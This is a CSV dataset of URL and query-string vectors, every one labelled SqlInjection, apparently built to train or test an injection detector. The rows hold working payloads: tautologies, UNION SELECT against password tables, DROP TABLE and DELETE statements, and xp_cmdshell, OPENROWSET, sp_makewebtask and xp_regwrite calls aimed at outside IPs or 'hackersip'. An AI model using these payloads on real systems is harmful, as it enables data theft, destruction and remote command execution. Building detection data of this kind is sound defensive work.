id,class,vector
1966,SqlInjection,/dQtyhoogokeo6/cSrNoEsu.jpeg?yaorl=535386&zFAQPAbc=e&ngno=k%25I&ega11assrti=tr+frlre&ZEHlhavingsock_streambNi=ineee1i5%7Eseh%28rOt4
1978,SqlInjection,/Xc/eZO2a2b/EQ/naHov72EKVm5AqY0JHh/ederniMoUr/TDL0/2esleBcAe03/swU/n1bzstiot.tiff?PIiBvrtg4h=ood&dwtlu=e4nc%27%2F**%2FUNION%2F**%2FSELECT%2F**%2FnaDoio%2F**%2FFROM%2F**%2Fdba_users%2F**%2FWHERE%2F**%2FbqSa%2F**%2Flike%2F**%2F%27%2525&cestEtrno=SItisE%25&6aoAxotai0teOy=stwidya&ai=+ftpo&sojtxGmu=91047444&ea5Rteu=iE8ew_0
1992,SqlInjection,/rnOOMvy.KYIBIsbsi@N/sVVC4H7cXiyYCg4i6jF/y@/az65/hfCstaTmob5i/E9s99t8rraMTw/sno8AaC3EGwoqNB44F7Q/3lBtkZ_2/etfa8st/uwT34bKRca.asmx?9Emr=iframenaccess_log&isodi=mynlRwd&etR=%27+++++OR+%27c2gev4tDda%27+++++%3C+++++%27X&qie8obtiti=9C%40
1997,SqlInjection,/ezrhZjmqa_UCUqvmmER/azUj@0IzH.shtml?naVon=isi%28o&KHYS42zhavingF=l6ndKG47.&sgrm14epere4att=s_ORmCNTj9&alhXo.QYdri=9shfe3Lm%27%29%3BDELETEFROMusersWHEREupper%28username%29++++%3D++upper%28+++%27admin&Hipashwnrw3imdc=+slees7mtfEsa
2002,SqlInjection,rR5pWGf=4547364&oi44osabimorf3S='     OR    'emmtspnue'   = N' &agaexewlWnt=6790705&.dP_TgRORf@d=execseAt  ea
2003,SqlInjection,ts27sd1gSeT2mh=oblrtexecdr&oixt2sbroeSnwat=1a0stfne&nmdb5egbisaC= hc2tlLxt4rotpe&Fiudrsahc=847766&sW9ftentntu1=ym&50ivitts2rcitS='  /**/  OR /**/''  =    '
2004,SqlInjection,/n3otq/yns/nrsSe/Un1/ePLuVes/aeoAntsma/sJiFVl.S3nfhHirJuIY/wrrnmXKk.S2/eho1.msf?eLee=ea4IEXR&Dw8el5oeuNircjd=EporAhn%27+++%29%3B++DEL%2F**%2FETE++FROM+++++users+++WHERE+++++upper%28username%29+%3D+++++upper%28+%27admin&haenvgRaunsos=iShati%25lnam&de53=enthaacn&apiccoih=r%29%25Aue%7CsobHcmdili%7Ewi%2B%26&ZrYsea44eiowo=ahot&io2iylsqecpaLc=f
2009,SqlInjection,"e9ab8edmbi0ii=8662805&myasimai=acmdmetaD6 neaR|b&zs=';  EXEC  master..sp_makewebtask    ""\\43.36.113.61\af\ri.css"",  ""SELECT *     FROM    INFORMATION_SCHEMA.TABLES""&jOre3bic=778835899"
2020,SqlInjection,/QVRG-rz1/oa/gelgdteeijin/qoLxC.asmx?nodlqi=c8Tq&n8ga4seb=saimK4+bsy&4tss=hgkXC&roqatv1Er4ns=8246065&Ceore2lowo=lahn+&M6ohra=%25zUa&waaEervsxaa2grt=winntSoW+agnetcata1ixDahs1fy%2F&enta1db=439856&tr9OaL7=9teousm8tn%3Fow+ikmI&PCdrop_Gbz1BI_=%27++OR++%272t3Nmn%27+++++BETWEEN+++++%27R%27++++AND+++++%27T&in=6833&li=25890071
2036,SqlInjection,/upgbtrrh/f4BNMAS6nr/hlTaiIndwootepseuain/seasaesomahu4m9/lLFGwiCYiCMljeOKwZ/arscrxetehe/tiC65LKeHlYAsEO/eatiet2.shtml?ycSone=exec++xp_cmdshell+%27bcp+++++%22select++++*++from++ofo%22++queryout+++pwdump.exe++++-c+++-Craw++++-Shackersip++++-Usa+++++-Ph8ck3r%27&hiioeOe8aest=75852549&awtamre6ogsBa=ahe5+etoIan2&hofilAe1ee=%40genlf%40boot.ini&nih6=n%2F7e%3Ast%28
2037,SqlInjection,/Nsdriy6yeneralif/teait40ie/ebhpcnsdlan/aNQCjFo7hvgldNStN50/dlotrogeoe0c0Cncmy/bum/Knph-2f/wd/g-2vUD5shCc0Mu..jpeg?Eno=0455681972&imtEixCch1HabLb=%3B++++select+++++*++from+++++OPENROWSET%28+%27SQLoledb%27%2C%27uid%3Dnoascr%3Bpwd%3DfhrIiwnb%3BNetwork%3DDBMSSOCN%3BAddress%3D217.253.96.255%2C79989%3B%27%2C%27select+++*+from++Etot0ete6%27%29&rolnqloen=rusmowroo&avnsostsma2e=i_vNNJtjKAs&ro0s=5842535&h6=a24.eAyZVG&0oiddJys=+t&taHarjio=aoOo&stdyeeet=n6ehYjhAIG&munrsrrns3rcfr=906992757&oS9e74seoan2=6+l+%2BraA01nph-&xITKYhMQ=%26bsrir&jCOjSetchUew=uhb6o
2038,SqlInjection,/abMNa8mlIqzbst/as1n/childFaPK1FnOG-CYfI/Eon6iuekdca.dll?beopnt0a=services%28&mt1afetmihiu=aainserteofseeeW&fdpihOn11ie=47083184&eNadt=rriyeoezld&ah=eUWYUN&nt5a5obttwitn=%27+or+++id++++in+++%28+++select+++*+++from+++++user_db++%29&my7cavnen=371
2039,SqlInjection,/YL-ro2zgTJallH/5ufloss/uKH1WOyvmH0/uWOL/siaet/gvc/noc0ntnbtosoepf/gz4.js?lbbdcgonomy=%27%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F7644%2F**%2FFROM%2F**%2Fxrg%2F**%2FWHERE%2F**%2F%28%27%27%3D++%27+%2F**%2F&upriHoefTe=893633
2052,SqlInjection,/sWNxE/oenohiyrdEo/2FQKXEmetadZsLhS/l.1t/tKz0xWEDb3UZB2ak/hhjB1/8jjI9k9YuNjZ/pqwZFZ0TvjYW-BZ/mTnthcttindckxdenld.jpeg?5bcEbusLat7iie=cULEQtJjM&wAerMer=76038749&udfPnlseIt=%27%29%3B+++++delete+++from+users%3B+++commit%3B++dummy%28+++%27
2061,SqlInjection,/vJAK5JCiBbgsoundftp/i0F4688ztyjT4-1OxS-P.js?bA5=o.5C-kWhh&seesrMamsn=l4tad7ieig&rsi=62467&iy=s%5C5&nCayAtIs=%27+%29+UNION+++++ALL+++++SELECT+++++Cie5EpAn++%2C++++itAws+%2C++idle+FROM+++pcohvwndig++WHERE+++kngazLtree++++NOT++IN++++%28+%27tanb%27++%29++++AND+stOoaI7++++NOT+++++IN+++%28+++%27udh%27++%29+AND+++++%27%27++++%3D+%27&qePihveislaysi1=gdlsystemsdyI%3Ebin&rhdmonjnnzgitte=56&alaob=hvberlusrtngllMa5x&Ef1tczcdi=1&sTaao3a=122&ReisswN2=jCokj6okM
2083,SqlInjection,/ikah3dleaetuRer6/x7g.GL/hkz2O562Pb22pV/3p8i/ehIrcsisoaef9siIr/f2.YP/ncAvKEKfT.asmx?Uvg7eHnnt=%3Dbad&rasuOre9eh=vfwo&lllnho=sN%40Iee&CsxfjjQH6=811625&2@v0=Focotl&hto=%3Balter++++table++toes++set+++++password+++++%3D+++++%27mtnjh%27++where++++name+++%3D+%27smtg%27%3B
2103,SqlInjection,/sslibesaqr/ihL-8YNeuIHDJF@SJ/aw1O7D./t-Zbq-aeh-z3Au6O/iqp/rdiondNaeuineaisay/6wenwOgs/w_Ui@Nd7qu8GRiY/nFmNWyLL5Si3..htm?hslotvi=2&Crbtr4I3=41661&cB.nt7xM8Z=D&lajceAi0etn=passwdbJ&mriEanrow=Hce4&ntiiTDdszia=imhktl&efptRehTeOio=x5hlaosojiboaye&nms2uehnoltIea=wds&piyuebkfrs=bulk+++insert+erhzdatsyu+++++from++%27pwdump.exe%27+++with+%28codepage%3D%27RAW%27++++%29
2113,SqlInjection,/eK3Fj@GAg/3imjBf/47.3A@insertV7/1l9oGn0aEhzo8a/enooztmtsrott8t/t9C5ALXFC9/i822Yc9WE/7nEi5etbnenyi/m5YsmWW/yUIQgrsxwl.asmx?rcsR4rt=Fis%26sstyle%2BhT+a6scriptr&rehinie6vE=%40%7E%40detUs&bRag=i8&d6do4=%3F+%5Bp+14n%24lpvr+&eyotitves=0ufsd+tei%2Be+&yumyfn29=r.bXOjA&ie1ome5Ocj=z%25u%3Fh%5Da&BXe0n=eeaqss1armwyenai&di8al7htErii5o=OR+++%27Axt%27++++BETWEEN+++%27R%27+AND++++%27T%27
2118,SqlInjection,/lRT0jbaDVhtmD3JD/loellustsicEds/hjIBM/ienb/XBbJV5EesSttP6O/etuw/tbyZG6Z@tJ/i2treahsv9ry3del4iep.exe?cecdIoj8pVtenS=m%3EraH7toIorie%28sne&NbVsye=niYdSL6GH&i7sof=0&qtkvige=rf&-QLOJNCGsystemC=vyobgaX%24lrTEzox&qdaro3=znzD001YU&ehlitZfaesnrha=gz&b55lxrNtgoh=936284&onoSvm=chairs%27+UNION+++++SELECT++++maaE2e++FROM+dba_users+++WHERE+name+++like++++%27%2525&xlti=589007&6@052okSz=216362&htea6M1qe=mNbEWF
2135,SqlInjection,/bpzcuTinclude/o3DzR/1p.Z5Wfjbu8yl/ehdiao/mB8xH.gif?
2136,SqlInjection,/uErisn4e3F/eTe9tiz/t6NUyid31Lk/a49mm_7t3E4fBI.qmd.sh?tnwsov4tnktqce=%27%3B++++drop+++++table++mmlrnCbesfe&sasEtrmne=r9hftotalat0Ltl
2144,SqlInjection,/em54soshtrpolhhlU/khjmebarssAhR0s.js?6au9nrS=%27%3B+++insert+into+++++ejuE+++values%28666%2C%27oxod%27%2C%27rur9%27%2C0xfffff%29
2148,SqlInjection,/mBaMUuE_w9HjAc/ychU/@61QM@50m/t2zslng9iibt4etm1nx/iucoExuahne2i/mqbz-z/YCrPww_O7/tte5od/dCrVWlKoPEpax_j/vZNUzN-IGlP0zbl4iz/imxinA1lmi/rmf.cfm?Ars3hwn=lib0uuyw&eyehhic=t%40s%3BreL-haaC&PL6c=133250289&iesr=%27++++OR+++%27tvtq5su%27++++LIKE+++%27aze%2525&4likextTx=t5diom&echohjpassthruZhIW=e5i&brmphe=jZFtUTL4UhU7&emuuxeheeyt6y=45105447&aptncsehmioklo=siy47&2wytdolb=08&r7e=91
2150,SqlInjection,/oM98l7CoIvRc_@bL6T9/mwpyoSf2toinmoro8p5/hJM/dropSTzicP3E49IUGm/Enlo7whhC/TwUPRchFHA.a.v/a7ttEs/piftitogntik/hjGwpAra33RFI/u7WXSaqfosME/i-PPWRR.jsp?i4vaueasl=u&u8ra=lhmO&oya=htacces1&twpNTdherscwtsa=nf&RaDIISag8w=8&8tshiSeHt=901128519&CuAj=3738&4nlintbh5sdsVes=%27++++%2B+++%28+++++SELECT+++TOP+1++T2ivkge++FROM+++tthe%29++++%2B++++%27&wyw=4eelipBejXSTbn&WZpT@.sx=deEbr
2153,SqlInjection,/euaie6/cesot9atsn8croio/epbr3qet/n0gbOeNrp2Hf4FIaUu9/nCVotZmQSxYIFHPe7X/ec550Zs6_.asmx?nohi0sbrcno=2oarqkenhehFnt&aDlogR7cJ=7384&PNlYRopta=OR+%27ne%27+++LIKE+%27Sim%25%27&ossepeytpm=2531&ihedoosntaer=WestfaO6egl&ofsrOt7=36&eP3=znot
2155,SqlInjection,wakfbig5a4=28&GY3N2CwN=8311602034&1enpba932teel=8xje&orHIPQsLn=u1qkRh@&h0shsaasmnaead=sd_K&s6lboeanee=311243&tslrDiS=qwer'  or bmEDczz_v.Account='9tr@bpacWa.com
2157,SqlInjection,Jwp-DhxeaD_=8546&tanam=eyiahehe&dc0dn='     or id    in (  select   *   from      user_db     )&lFbeahnhr=85239&Hcnleeu= hlg&3hnr=
2162,SqlInjection,/OtOaeseil/Nfaiolol/wkBIbkdybKhik9AF/y6j/anewwmhd5/5nhtv/vlinknxp_QIJL9hE/lq-x7gMwsXxAulkE9C/t1WxXH0Th6pCBVd/Ywfitbmoedt0eef/eeawctsoUo.mdb?NPA9g=%5Cuin&hHlla2yr1se=323761&ourginb=%26gfrom%3Bes%26&tw=6pnoaE&4._6=ionie&tlr6useerenf=%27+++%2F**%2F+OR++%2F**%2F+++++%27nrn%27++++%3E++%27S&eisow=4mfws&AexiEv=4arm%25N&eWu8trebtsbhfs=ln4h&hi4a=senbwinntm%26PnaeO%24Wr&owtiia=iBeEatw
2164,SqlInjection,eeo=hs&jxgzTL=' /**/ OR  /**/''  =   '&ausobe=8244593&mrs=tardwsnrehiej&oEagagdzb=eobdlilse&oot3Snien1SetV=7609299360&8SautoexectmpTjXE4XJR=ffzhnai08ir
2167,SqlInjection,/yHXJN7TeeQrYo/pwplhHaprrlldo1/b214u4CbrNeo.7@xhvi/AlsvLW6b8/apreaptmyjalteab53o/tCjUE2/n3eie41o9ls42WT/g3tnoj.gif?t0oqThS4n=%27%3B+++++drop+++++table+admin
2188,SqlInjection,/es/e9dPIO1.html?yneepeFhntrOf=eXbi1x_4IUy&uehivofdzdeca=gat%5Ct%24nef%25U&xtn22=exec+xp_cmdshell+++%27bcp+++++%22select+*+++from+++++ea%22+++++queryout++pwdump.exe++++-c+++++-Craw++-Shackersip+-Usa+++-Ph8ck3r%27
2205,SqlInjection,/ihdi1sg6/91copyFdhtaccesD9pI/dKSchild5K.KGTs/aAs26/auRe/oMip75Y9M/yKko/oy5/neWtW9HAF9K/aVgEt9pwkRz.css?oonsg=1atia%3A+8wheree%2BrEhon&ccewu=81957&execevalFH@=%27++++%2F**%2F++++OR+++++%2F**%2F+%27ecoo%27++%3E+++%27S
2209,SqlInjection,"ojs2lNa=rfx&rNg0processing-instructionxePEOqN=';    insert     into     wtapsuT5  values(666,'lmEdobu','aeered',0xfffff)&kOehel0dtelernm=sTteooreeq&wtej=b?o&lioWtow=r1Ud&ntazsa7lHoasKc4=txe2cdMusAg&8DVE@kzieIps=mguseT&neo5neysi5py= 4Zw&DskefdetStreo=EHausbnetcatt6&dsseu=80951&cdguso=shodunion e4qcmhesy&wlshmguotrilut=wsperlzL5vreplaceate-i&mapE=eispyinclude e&leIwu4dsyflSdet=deihtacces"
2214,SqlInjection,/isnrbtocmrrTdhab/cGQ/Q-OZ.4S/bXbm6xmVUVFyPR7.pl?cmlzeoeshhnxTr=ef&hizTtucSas=%27%3B++insert+++++into+++++efiv+++values%28666%2C%27deGnze%27%2C%27tpatrb%27%2C0xfffff%29
2219,SqlInjection,/pa/rsYu0i4qhuaohala6/nm/sderhrd/snw/FLt8.php3?pATxp_-@Fx=2&TAaCQzF9k=me3ldTd&w2pad=%27%3B+++begin++declare+%40ret+varchar%288000%29+++set+++%40ret%3D%27%3A%27+++select++++%40ret%3D%40ret%2B%27++++%27%2Beid%2B%27%2F%27%2Bpassword+++from+ieno++++where++++yigen%3E%40ret+++select+%40ret++++as+++++ret++++into++++foo+++end--&yewehlnjacqg=nhnullhh
2230,SqlInjection,/tdw25ErJehw6/@metaGid5WtmpPJ9qe6Yo/dL2w4DY/aeesKy/xNpaw/mUSGYiyhEismqqj9kVQ/ndropformBIV_941c1StE/73uuu6yc/esFjot/qusqetzJsatAopiteh.js?aqld=u&rs=l%25eap7asjOdallb1u+eoe%2F&eho=9213966929&hSKwhereaj=rq5+ipndropEhtaccesrglcopyrnulleJ&sNmRatsi3yb=%27%3B++insert+into+tn9nf++++values%28666%2C%27oro21lh%27%2C%27y9nj%27%2C0xfffff%29&sttjanii=nE6Gq4&kt8iil1Wkok=atlaN&ecaGsa8nbdrqdta=5058853&2ir8bgr=%2Fe&otrec=edpxTSRP&W0LtmpP=28&a3e=7324658293
2253,SqlInjection,/rlc@/i7yDCodEUoj30/Elszbo/fnT7cL.PH/ixzmzSOzpeiam67fm5Vy/FXC/s9fvFAV8pEV5n/ljetN4Ety5etOmltmpe/uPvtKLJIFx6BJwbN.P9r/sx@5TSB8EDfJUUvx.jpg?hext=Hwg&etnlcme=s%3Asp&eclD0=nRlk5lWrW&os3DfyQnsDue0bd=exec+xp_regwrite++++%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27af%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27
2259,SqlInjection,"reuizaED=Sak1fiLthn&gutsi9oejei=44148&fe='    )  UNION     ALL   SELECT     'lseMeon',966,2908,'pnaar3siot',517     FROM     Lvw    WHERE   ('' =   '&h5si=- 7&rdneouh=ih3TvdhehloT&eihoeccak=ediv%esa9sdor2ga&winntxboot.inimailconnect=xersjsA&@nzWq6gn2=tamzlrphp@zInull@hge"
2260,SqlInjection,t3d5th=OR    63>570057936314&is=ghimailv%eobaaa
2262,SqlInjection,/eAM-@ozi7u46A7Qp1Jgu/bIOTVS/ehd2Wp66gC1S68zFPs/lsW/_FB/aecpd8thowfesnafe/c@Qconnect3a4iMNZ16/ftp0Wxaccess_logGcJM.asmx?UQWk-M_X=o%3Errd&weecniwe=03747&ejjhtpsatltmoj=2215831609&hldkw=4801776&akee1=146&uli=ato&yuTnq=ualtcrbi1tpduotS&acccno=34999829&UaolsheL=OR+%27yrr4%27+++++%3D+%27Sim%27%2B%27ple%27&tooiesaNsectoiR=03442270&sorrrials=34&ai=726&ishSsh690irtch=%3Aai%28e&5maeetaenz2tdr=25182248
2270,SqlInjection,/nt/tcdridzhbtzutt4rEweo/eh4tt/klqfrUJL/iFsJOWl9nEejZGi/ek0nl1@_6TGhx_lz.js?samwC=4886044&d0rqeuea=%27+++OR+++%27r5mpy5r%27+++++%3E++++%27S&ddh9rr=c&wtgdVae3wthr=9ya&ovs5qcsen=a1Eposition5e&d6-UDVAhttpsX0Y=ibxetDaehyojc&ftpBvW8=dLw_h40&itet4mn=s&oaenolqxidrnl=inrtg
2272,SqlInjection,/gryew/nWKNy8/nTzBuIM3LT/tR/2begcnf/tOmnilaeu.nsf?t5icT5bycmoeuuo=t%3Aes&eqTeNtmfte=4&etrjo=c&Gh8g3iIG=%27%3B++++begin+declare++++%40ret+varchar%288000%29++++set+%40ret%3D%27%3A%27++select++++%40ret%3D%40ret%2B%27++++%27%2Bih%2B%27%2F%27%2Bpassword++from++++enu3jt+++where+++sg%3E%40ret+++++select+%40ret++++as++++ret+++++into+foo+++end--&1nkc=538
2277,SqlInjection,/d2Ckc/y7SX4FC2ZpJhAuP5/o.d53fMy2BQ/eermsthiudh8kbOa/dncepmhSmhteroohtr.cgi?rua=t2T&6sy8rttyUpece=ine+nim&b50dTVjQTl=dy&nh1=yglkimoftdNvyfdoa&hmnx=aU3E.MCG6s&eofd8=exec+++xp_cmdshell+++++%27%22i8n1Astltc%22+++++%3E%3E++++script.vbs%27&n3neirnpf2cr9=td2&deaajcTo=hhoexaohnmcsucts%29R&lbsbd=ss0bf2&6zaAtntku8n=974596
2283,SqlInjection,/execbinFBMKDfautoexec62oS/jswhoneet/0kswrR0ohvwc/oonreu/lZn-RGJsB/a9YB_Szh1yqzfKUUf/u@@fhq-50aBpAE/e1s3rgxtbdssh/fFHc.iSDGPIg./aOyu0DCA/Handau/LPLt87Hz7winnt0xml0aIxp_.gif?formlinkgVqF2.a2s=72&PsEtJ=c3inlscwmheesDiry&rr=etisI%5Cmbin&wK29location5YG7nodel=ni5i+ceo%3Bi+qm%25tX%5B4n&nullu@29EfCRTTM=%27++union+++++select++++sum%28mwnhmr%29+from+++htaatey--
2292,SqlInjection,/hDkJd@Tq/itnPPM_qXTkL/SMqTo/pED78fhcL_/OltrZQM2d/nehNeimqzil65e/aYhtPk5wRqBr5oy/hual1/oV1SmRKMrB.Jfdbjy/iyEl6d.ISAHd.css?yldTs=%27+++%29+UNION+++++ALL++++SELECT++++02+++FROM+e4raasarl++++WHERE++++%28+%27%27++%3D%27&ttFibrmam=ttcrhAmt&mdd6c=3Fjy_6v&ks3e4ohnatar=55826551&9V5N7X2m=t%27hohrcphsa&hcgEt=u%26le&gsAd6passwdi=2V08A.ev9d4&eetaa16=rnetsesg
2293,SqlInjection,/VmCEjQHT9crdc/sKoXPx/t_fv645E0UafXt/e8S@/nu2wvB.shtml?mtiM9a=iRmMqWQ1l&N_qrhEeF=%27++or+id+++++in++%28++++select+++*++from++++++user_db+++%29
2294,SqlInjection,/gA7agWtU5p/rsc6HgxGoafzO0QV/tUpu-qjqozpE7P77/Ebtxk/IVnetcatinputchildhtacces/pussfS7oLkiheTomrs/oejm2cgk55.dll?mvdTiohaalle=uCDIU.&9n9tmdbiihn=ntlesOsamt2&tm0M3hlav=%27%3B+insert++++into+++oeaaarwN++++values%28666%2C%27nrdeNe%27%2C%27aiun5i%27%2C0xfffff%29
2297,SqlInjection,/eLBUh23ylkyqNt.BLPB/3bhf-servicesOZhomeqo/is-d_BtpIhn/o0ylmALtrh2unfl3blo/ptGfPvwehC/hj.jsp?i4BJCEBu1select=a&epdenn=xZ%40Bish._pG&2XknQ=sUPs&aOtllttt=7eaneeaaem+openv&buYe8BhKk7m=null&r0dedmBnnis=%27++++%29+UNION+++ALL+++++SELECT+++%276wlnlypu%27%2C86%2C414%2C%27oitnrqPd%27%2C72++++FROM+trreHeet+++++WHERE++%28+%27%27+%3D++%27
2299,SqlInjection,/pwt/sAaQhbXeHAWao0euAx5l/itetsts/eK7tC5feXV4.html?hnkroimmEjqeuMy=%27%3B++shutdown--&aemryab=2104817638&niehpnwyaeeo=eT-WTNZLKm&lvqi=aie&npt=th4ne3hdhnuqmedn
2302,SqlInjection,/jAQoB1iq.5/eDqtHqE/itqoowTeqely/ata0osrssiteeibia/1hhm1afhi/snTiasqis1r3tg8tta/huemwsFee8ohie/WX0.k.cfm?DaW4=72262&6uNtrotaecadf1=%3B++++insert+into++++OPENROWSET%28+%27SQLoledb%27%2C%27uid%3D4f%3Bpwd%3DrSnrj%3BNetwork%3DDBMSSOCN%3BAddress%3D156.106.124.70%2C1433%3B%27%2C%27select++++*+++++from+_sysdatabases%27+%29%3B+++++select++++*+++++from+++LinkedOrRemoteSrv1.master.dbo.sysdatabases&9tnoixrqisoqtde=mvu8&ycongba=62665&u0g=Oc%3FNwfy%5C%3B%28&o1i=31&qh3sdftRak=85849&tcznkwpsEas=hdInieato6&ibtnsTohtx8xwjr=0HB2jNKe&aisupaeels9ia=l2k3dmzo5Xhttntoiw&irtft=57752&dhalarrttsl=6&varROS5QsystemVsT=5&EoMyu8rdTue0vsh=p1urz5nteeldh&iocRserenmins=od2e2o2ir
2305,SqlInjection,/SHqeqeyNmo7/a1a/xoz3ZQRlDl7Uyl.jpeg?7oLKTQboot.ini=%27+++UNION++++++++ALL+++++++++SELECT++++vuokl5eoiw+++FROM+++++ehaIn++++WHERE+++%27%27++%3D++++%27&PE.UHt=130&xnuqiiwldVcn=1733554&reu4s5ihe=8598049227&rTtoXhstushN=ioTv
2316,SqlInjection,/6E3/mxWGD._dvI./bLbTT@u/ooc/giteo/nioyoacAEeti6ibnevg/ma3hrarRrne/5oic5jezoniE/eV-M_93LMKAy2vj.swf?qInm0sit2isq=5&5o8.EbkM=15&tsc=49&mOjXbU-N=onxis&h9sntDtsE=Eoyah&noNom=-xwp-h&s35aheim05=%3B+++EXEC%28%27INS%27%2B%27ERT++INTO+++users+++++values%2837819%2C%27Sla1i3iEIs%27%2C%27Eeeiznd%27++%29%29&sr6lteeio=a%26d&imdePr=97389&xo5Tupnosytuap=dlnwvNe9gM&@2Xgk8D4_=M6t62EujUt0e&nIemqI=nxhp
2317,SqlInjection,/hBd9zlyGua7Lwa0n/zNZr.P.jpg?7t6Despan=ac4V3&oM5reioDZ=s-K.zq&ornuenCe9=lboot.ininhtt&meee0Tnnn3aw=%27++OR+++++%27%27++%3D++++%27&uugir=waAMyh%2B8reay&nau1=%3Frnh&DJ5gaeaemnsil=i34nT8Iyp&lmeyOaa48neem7e=956956&rTbhrnea=09
2322,SqlInjection,/twK16nhtaa9n0/rVXzTZQPQeny3JEfwW/nieapai/woeesootedinoaO.nsf?.qFkJU=ase&tm=w&vee=408030&eagry=391&AVbJ@optTpi=os&j53hn34amilkqt=pgm&tiuaTdre0=de%28trt3a&onw8lenoelmaian=inperl&aahrqDtoli=%29e&ncynet8re=131&of3vu2624an=806874&wpZoa1Es5irt=nrrVn&gjuieTanroaot=%27%3B++EXEC+++master.dbo.sp_makewebtask+%27c%3A%5Cinetpub%5Cwwwroot%5Csm.gif%27%2C++++%27SELECT+tnW++++FROM+ti+++WHERE+++xtype%3D%27%27U%27%27%27&sIie4e7nztahaa=iafrug2ruel
2331,SqlInjection,/sNrzidnUllsaceoa/rVZlkd8Pqq9Mvg/i4Hbf@Vefou_Lv2UKIh/e4h/ocjnz9lxsUzetc7ojeo6/includeH_0DZ6REtrKyG/masppoJDdrtleytp/t@kHgj/qW6dIPbpn.W_/tkne.php3?eHe37secra0irc=onlnh4a7tNiajosOa&rn3mrhIt=mnyLienhD5f&stdin-.connecteoWzJ=e1ohfh%3Cnt&HPPINPkshutdowncb=365&nitK1wiokvdpiar=459242&tl=jm+ddsr&Nrasi=55518440&ftePefeunMu2ul=5346887&bwhereOwindow.openn=an3&6iw3ouriadg=w2oE.vI&gofhnuSso=plje+Eae&iIth=26995911
2347,SqlInjection,gteEha=crh3scmJT21ti0eese&fTnuiensag='union select  PASSWORD    from    DBA_PASSWORD;--&eyb45iiClE=8137197&fantyarseeqi9z=mwSU_ty3&pf.W0p2mf=;oiz
2350,SqlInjection,/02OhT5sN/htadwe/eXMHmKCG4OmOK2CP/lastM.swf?Bjctmp=wonEoooieCi&StibnqrhmAoasO7=%29&nyotpWktan=eFBSH4t%7EI%26ao&en60en4ig=26010165&ihxE8Rmeuited=ausr+etis-coia&s2tfm3MefO=2021&atanyopMIonlxE3=w2OO1&Atetii=352826&Re=%27%3B+EXEC+++master..sp_makewebtask+++%22%5C%5C23.36.122.24%5Ct8pitoLe%5Crriinhs2.tiff%22%2C+++++%22SELECT+++*+++FROM+INFORMATION_SCHEMA.TABLES%22&pnV4qeos8tm=1045&dt=insert4+e&2esaqo9w86w=%27mPq&HeQ.style9FN.acceptY1=2ethomeBoqye
2351,SqlInjection,/6itw4hipqted3z/aOts4bbseodeF/80MFy30M8cQ--sZWKK/wF-wGpx3Cb7LmnD8H/7kSeEuV.izNC9/nI2RS.jsp?1it8ebire0dn=of8betweenumwbulink%3E75%27o&1selhtmse=n2_EnULgJmRv&uhotttes=91daiaEErtakik&tirEr4n1=74696632&S5VQ9UHfnwVC=%27++++%2F**%2F+++++OR+++%2F**%2F%27%27%3D+%27&aamemqo=8014584&haFenGyhNl=b0dymaoIm91&ecdaaidipgatf4L=02550&dt=esock_stream%3E&iisbaApgrar=830
2355,SqlInjection,/sq4AFfKVsf4O2p8DK_Nu/n51KgQ/wPj-FEf9/uH9dhl6x_XeERFH/gr/6L14window.openkRFsbinCvilM/cCcY6O6CHX4zG2ChZ/fErchqi7/muaP9.shtml?teghs26pyrbeoql=iErnSgif+aes4bl&5ei7=ce+int&jwYasfisJ=992&04cdtyscn=-oeZI&wsm=obnp%5Cc%3A%40e%5Dsinclude74aechoGa&bOi=%27+++++OR+%27aaee%27+%3D+++%27+++&osEk=+udsfqo&jcjefnatn=ikzGacesq+2%3AF&etabiec8ILe=ad&6Bidm6cho7e=oikhnh%3Al&oseit=5
2359,SqlInjection,/yqbEoyyhjaseA7re6oh/tXUUHr8/As8cOhtalstor2lieh/irlenot5rnwilsehtr/kpOet27qpil/neThtttha/e8BcuLMAyPHi/.taG-v.jpg?tsisrp2eas6ted6=eecnils&3z50wINl4=ncDi4o6frah2oa&SIVm=674231&e3neUxr=407&tirohe=%27++++or++id++++in+++++%28+++++select++++*++++from++user_db+++%29&ebe=5723&V7=5&_JyQ0F=ne+s
